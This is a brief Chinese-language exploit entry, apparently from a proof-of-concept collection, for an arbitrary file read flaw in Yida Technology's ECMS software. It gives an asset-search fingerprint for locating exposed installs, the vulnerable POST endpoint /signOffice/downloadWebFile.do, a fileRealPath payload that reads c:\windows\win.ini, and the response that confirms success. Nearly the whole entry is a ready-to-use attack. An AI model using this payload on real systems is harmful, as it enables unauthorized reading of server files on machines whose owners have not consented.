# 易达科技ECMSdownloadWebFile.do存在任意文件读取漏洞

易达科技 ｜ 任意文件读取/写入 ｜ —
- **指纹**：`app="易达科技-ECMS"`
- **请求**：`POST /signOffice/downloadWebFile.do HTTP/1.1`

**Payload**
```
fileRealPath=c:\windows\win.ini
```
- **响应特征**：200 [Mail]